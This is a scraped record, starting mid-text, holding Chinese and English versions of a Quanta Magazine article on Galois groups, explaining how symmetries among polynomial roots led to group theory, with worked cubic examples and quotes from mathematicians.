\u201c\u5c06\u5173\u4e8e\u591a\u9879\u5f0f\u7684\u95ee\u9898\u8f6c\u5316\u4e3a\u5173\u4e8e\u7fa4\u7684\u95ee\u9898\uff0c\u4e3a\u8bb8\u591a\u5176\u4ed6\u6570\u5b66\u8fd0\u7b97\u548c\u6280\u672f\u6253\u5f00\u4e86\u5927\u95e8\uff0c\u8fd9\u4e9b\u6570\u5b66\u8fd0\u7b97\u548c\u6280\u672f\u65e0\u6cd5\u7528\u591a\u9879\u5f0f\u7684\u539f\u59cb\u8bed\u8a00\u8f7b\u677e\u63cf\u8ff0\uff0c\u201d\u5eb7\u62c9\u5fb7\u8bf4\u3002\u8fd9\u79cd\u5e7f\u6cdb\u6027\u4f7f\u5f97\u4f3d\u7f57\u74e6\u7fa4\u5728\u4e0a\u4e2a\u4e16\u7eaa\u5de6\u53f3\u7684\u8bb8\u591a\u6700\u8457\u540d\u7684\u6570\u5b66\u9879\u76ee\u4e2d\u53d1\u6325\u4e86\u6838\u5fc3\u4f5c\u7528\u3002\u5b83\u4eec\u51fa\u73b0\u5728 Gerd Faltings 1983 \u5e74\u7684 Mordell \u731c\u60f3\u8bc1\u660e\u548c Andrew Wiles 1994 \u5e74\u7684\u8d39\u9a6c\u5927\u5b9a\u7406\u8bc1\u660e\u4e2d\u3002\u4f3d\u7f57\u74e6\u7fa4\u4e5f\u662f\u5f53\u4eca\u6570\u5b66\u4e2d\u4e00\u4e9b\u6700\u4ee4\u4eba\u5174\u594b\u7684\u6b63\u5728\u8fdb\u884c\u7684\u5de5\u4f5c\u7684\u6838\u5fc3\u3002\u6b63\u5982 Quanta \u5728\u6700\u8fd1\u7684\u4e00\u7bc7\u4e13\u9898\u62a5\u9053\u4e2d\u6240\u89e3\u91ca\u7684\u90a3\u6837\uff0c\u5b83\u4eec\u662f\u5e9e\u5927\u7684\u6717\u5170\u5179\u8ba1\u5212\u7684\u5173\u952e\uff0c\u8be5\u8ba1\u5212\u5c06\u5173\u4e8e\u591a\u9879\u5f0f\u7684\u95ee\u9898\u53d8\u6210\u4e86\u5173\u4e8e\u4f3d\u7f57\u74e6\u7fa4\u4e0e\u53e6\u4e00\u7c7b\u7279\u6b8a\u7fa4\u4e4b\u95f4\u5173\u7cfb\u7684\u66f4\u590d\u6742\u548c\u5177\u6709\u542f\u53d1\u6027\u7684\u95ee\u9898\u3002\u5c3d\u7ba1\u57c3\u74e6\u91cc\u65af\u7279\u00b7\u4f3d\u7f57\u74e6\u7684\u751f\u547d\u88ab\u7f29\u77ed\u4e86\uff0c\u4f46\u4ed6\u6700\u5927\u7684\u6210\u5c31\u5c06\u5728\u672a\u6765\u51e0\u4e2a\u4e16\u7eaa\u7ee7\u7eed\u63a8\u8fdb\u6570\u5b66\u2014\u2014\u5c3d\u7ba1\u5f88\u96be\u51c6\u786e\u9884\u6d4b\u5982\u4f55\u3002\n\u201c[\u4f3d\u7f57\u74e6\u7fa4] \u53ea\u662f\u6709\u4e00\u79cd\u51fa\u73b0\u5728\u4ee4\u4eba\u60ca\u8bb6\u7684\u5730\u65b9\u7684\u65b9\u5f0f\uff0c\u201d\u5a01\u65af\u5eb7\u661f\u5927\u5b66\u9ea6\u8fea\u900a\u5206\u6821\u7684\u4f55\u585e\u7f57\u5fb7\u91cc\u683c\u65af\u8bf4\u3002", "note_en": "Before being mortally wounded in a duel at age 20, \u00c9variste Galois discovered the hidden structure of polynomial equations. By studying the relationships between their solutions \u2014 rather than the solutions on their own \u2014 he created new concepts that have since become an essential part of many branches of mathematics.\n No one knows why Galois found himself on a Paris dueling ground early in the morning of May 30, 1832, but the night before, legend has it that he stayed up late finishing his last manuscripts. There he wrote:\n  Galois\u2019 edict emerged from a mathematical predicament. In the 1500s, mathematicians had studied polynomials like  x 2 \u2212 2 and  x 4 \u2212 10 x 2 + 22. They had tried to find simple formulas that would allow them to calculate the roots of those polynomials \u2014 the values of  x that make the equation equal zero \u2014 but could only find them when the highest exponent was no greater than 4.\n  Beyond that, Galois himself proved that no such formulas exist. So he devised a new way of studying roots: Instead of calculating them exactly, he realized he could study the algebraic relationships between them \u2014 focusing on their complexities, rather than their appearances.\n In spirit, his perspective was similar to considering a shape\u2019s different symmetries. These are the various ways of reorienting the shape so that it still looks the same, such as rotating a square by 180 degrees. Symmetries between a polynomial\u2019s roots are ways of swapping them so that they maintain the same algebraic relationship.\n And just as some shapes have more symmetries than others (a circle has infinitely many; a square has just eight), you can rearrange the roots of some polynomial equations more freely than you can rearrange the roots of others.\n \u201cSome ways of rearranging the roots can be incompatible with the rules of algebra. In this sense, the roots might not be entirely interchangeable with one another,\u201d said  Brian Conrad of Stanford University.\n The extent to which roots can be swapped with each other while maintaining algebraic consistency is a subtle property that tells mathematicians a lot about how to recognize features of polynomials that can\u2019t be seen just by looking at them. It\u2019s easiest to see with examples. Let\u2019s take a look at two, each of which has three roots (since the highest exponent of each is 3):\n   On paper, they\u2019re nearly identical. But behind the scenes, the roots of one can be rearranged in more ways than the roots of the other.\n Let\u2019s focus on  f( x) first. Here, we have three roots:  a,  b and  c. We can combine them algebraically to make a new value by taking the product of pairs of roots and adding them together. For all cubic polynomials \u2014 those with 3 as their highest exponent \u2014 with a coefficient of 1 for the cubed term, it\u2019s known that this particular algebraic expression made from the roots always equals the coefficient of the linear term, or the term that is raised to the first power. In our example, this is \u22127.\n   Now let\u2019s rearrange the roots, leaving  c alone, but switching  a and  b. We get:\n  Rearranging the roots in this way preserves the algebraic relationship between them: The equation is still true because multiplication and addition are commutative, meaning that swapping the order of things \u2014 like shuffling the roots around \u2014 doesn\u2019t change the answer. In fact, for this example, all six possible ways of rearranging the roots (including the one where they don\u2019t change) preserves the relationship:\n a, b, c: ab  +  ac +  bc =  \u2212 7   b, a, c: ba +  bc +  ac =  \u22127   c, b, a: cb +  ca +  ba =  \u22127   a, c, b: ac +  ab +  cb =  \u22127   b, c, a: bc +  ba +  ca =  \u22127   c, a, b: ca +  cb +  ab =  \u22127\n Now let\u2019s look at the second polynomial,  g( x) =  x 3 \u2212 7 x + 7. If we call the roots  r,  s and  t, then an analogous equation to the one for  f( x) holds as well:\n  This will be true for any cubic polynomial whose initial term is  x 3 and whose linear term is \u22127 x. And again, all six of the possible arrangements still equal \u22127. But curiously, for  g( x), not all of them are considered symmetries of the polynomial.\n This is because the algebraic relationships among its roots are more complex: There is an additional special algebraic relationship that its roots satisfy. The special relationship is ( r \u2212  t)( r \u2212  s)( t \u2212  s) = 7 (when you assume\u00a0 r\u00a0is less than\u00a0 s, and  s is less than\u00a0 t). Only three of the six possible rearrangements of its roots preserve both algebraic relationships:  rs +  rt +  st = 7 and ( r \u2212  t)( r \u2212  s)( t \u2212  s) = 7:\n r,  s,  t: ( r  \u2212  t)( r  \u2212  s)( t  \u2212  s) = 7  \u00a0 s,  r,  t: ( s \u2212  t)( s \u2212  r)( t \u2212  r) = \u22127  \u00a0 t,  s,  r: ( t \u2212  r)( t \u2212  s)( r \u2212  s) = \u22127  \u00a0 r,  t,  s: ( r \u2212  s)( r \u2212  t)( s \u2212  t) = \u22127   s,  t,  r: ( s  \u2212  r)( s  \u2212  t)( r  \u2212  t) = 7   t,  r,  s: ( t  \u2212  s)( t  \u2212  r)( s  \u2212  r) = 7\n The three rearrangements in bold preserve all algebraic relationships among the roots, even beyond these two. Consequently, these three rearrangements are considered to be the symmetries of the polynomial.\n It\u2019s not obvious at a glance that the two polynomials have different levels of complexity, but it becomes visible when you adopt the perspective Galois invented.\n  Galois packaged his way of thinking in new objects \u2014 which came to be called Galois groups \u2014 that encode the complexity of the algebraic relationships between the roots of a given polynomial. Within these relationships, rearrangements of roots can be applied one after another, but they can be undone to get back to where you started \u2014 just as you can apply the symmetries of a square and then undo them to get back to the exact position you began with.\n This idea reflects the general concept of a group in mathematics, which is a collection of symmetries, whether they apply to a square or the roots of a polynomial. Galois groups were the first instances of the concept of a group, and Galois\u2019 ideas blossomed into what today is a powerful, ubiquitous area of research called group theory.\n Galois groups provide a powerful perspective from which to study polynomial equations. If you know the Galois group of a polynomial, then the behavior of its roots can be understood by accessing many of the tools of group theory. The insights you\u2019ll gain through this approach are far more illuminating than the ones you can get by performing algebra on the polynomial itself.\n \u201c[With Galois groups] you get this one piece of information, and it spreads and tells you so much more,\u201d said  David Harbater of the University of Pennsylvania.\n  For instance, the Galois group immediately tells you whether a polynomial can be solved at all, and it allows you to compare the underlying structure of different polynomials. Galois groups can also be used to study various mathematical objects in algebra and number theory in ways that open up solutions to problems that aren\u2019t otherwise available.\n \u201cTurning a question about polynomials into a question about groups opens up the door to many other mathematical operations and techniques that cannot be readily described in the original language of polynomials,\u201d said Conrad.\n This expansiveness has allowed Galois groups to play a central role in many of the most celebrated mathematical projects over the last century or so. They featured in Gerd Faltings\u2019 1983 proof of the Mordell conjecture and Andrew Wiles\u2019 1994 proof of Fermat\u2019s Last Theorem.\n  Galois groups are also at the heart of some of the most exciting ongoing work in mathematics today. As  Quanta explained in a  recent feature story, they are the linchpin of the sprawling Langlands program, which turns a question about polynomials into a more sophisticated and revealing question about the relationship between Galois groups and another special class of groups.\n Though \u00c9variste Galois\u2019 life was cut short, his greatest achievement will continue to advance mathematics for centuries to come \u2014 though it\u2019s hard to predict exactly how.\n \u201c[Galois groups] just have a way of appearing in surprising places,\u201d said  Jose Rodriguez of the University of Wisconsin, Madison.", "posttime": "2021-08-05 20:50:54", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "\u591a\u9879\u5f0f,groups", "title": "\u4f3d\u7f57\u74e6\u7fa4\u548c\u591a\u9879\u5f0f\u7684\u5bf9\u79f0\u6027", "title_en": "Galois Groups and the Symmetries of Polynomials", "transed": 1, "url": "https://www.quantamagazine.org/how-galois-groups-used-polynomial-symmetries-to-reshape-math-20210803/", "via": "", "real_tags": ["\u591a\u9879\u5f0f", "groups"]}]